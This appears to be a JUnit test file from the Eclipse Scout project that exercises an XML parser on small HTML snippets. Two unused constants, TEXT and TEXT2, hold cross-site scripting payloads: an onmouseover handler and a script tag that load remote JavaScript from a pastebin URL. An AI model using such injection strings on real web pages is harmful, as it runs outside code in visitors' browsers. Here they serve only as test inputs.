/*******************************************************************************
 * Copyright (c) 2010 BSI Business Systems Integration AG.
 * All rights reserved. This program and the accompanying materials
 * are made available under the terms of the Eclipse Public License v1.0
 * which accompanies this distribution, and is available at
 * http://www.eclipse.org/legal/epl-v10.html
 *
 * Contributors:
 *     BSI Business Systems Integration AG - initial API and implementation
 ******************************************************************************/
package org.eclipse.scout.commons.xmlparser;

import org.eclipse.scout.commons.xmlparser.ScoutXmlDocument.ScoutXmlElement;
import org.junit.Test;

/**
 *
 */
public class SimpleXmlElementTest {

  static final String TEXT = "<html><span onmouseover=\"alert('Hello from BSI CRM');document.write('<script src=\'http://pastebin.com/raw.php?i=a3qACGvA\'></script>');\">Test (hover me)</span></html>";
  static final String TEXT2 = "<html><span onmouseover=\"alert('hello')\">Test (hover me)</span><script src='http://pastebin.com/raw.php?i=a3qACGvA'/></html>";

  static final String INPUT = "" +
      "<html>" +
      "<head>" +
      "<meta http-equiv=\"content-type\" content=\"text/html;charset=UTF-8\"></meta>" +
      "<meta http-equiv=\"description\" content=\"This page provides test content\"></meta>" +
      "</head>" +
      "<body style=\"overflow:auto;\">" +
      "Test content" +
      "</body>" +
      "</html>";

  static final String INPUT2 = "" +
      "<html>" +
      "<body>" +
      "<table border=\"1\">" +
      "  <tr>" +
      "    <th>Month</th>" +
      "    <th>Savings</th>" +
      "  </tr>" +
      "  <tr>" +
      "    <td>January</td>" +
      "    <td>$100</td>" +
      "  </tr>" +
      "  <tr>" +
      "    <td>February</td>" +
      "    <td>$80</td>" +
      "  </tr>" +
      "</table>" +
      "</body>" +
      "</html>";

  @Test
  public void testParseString() {
    ScoutXmlDocument doc = new ScoutXmlDocument(INPUT2);

//    System.out.println("doc get body: " + doc.getChild("body"));

    for (ScoutXmlElement elem : doc.getRoot().getChildren()) {
      System.out.println("scout xml elem: " + elem.getName());
    }

    System.out.println("scout xml doc " + doc);

    SimpleXmlElement el = new SimpleXmlElement();
    el.parseString(doc.toString());

    System.out.println("simple xml element " + el.getRoot().getChildren());

    for (SimpleXmlElement elem : el.getRoot().getChildren()) {
      System.out.println("elem name " + elem.getName());
      System.out.println("attributes name " + elem.getAttributes());
      for (SimpleXmlElement elemChild : elem.getChildren()) {
        System.out.println("elem child name " + elemChild.getName());
        System.out.println("child attributes name " + elemChild.getAttributes());
      }

    }

  }

}
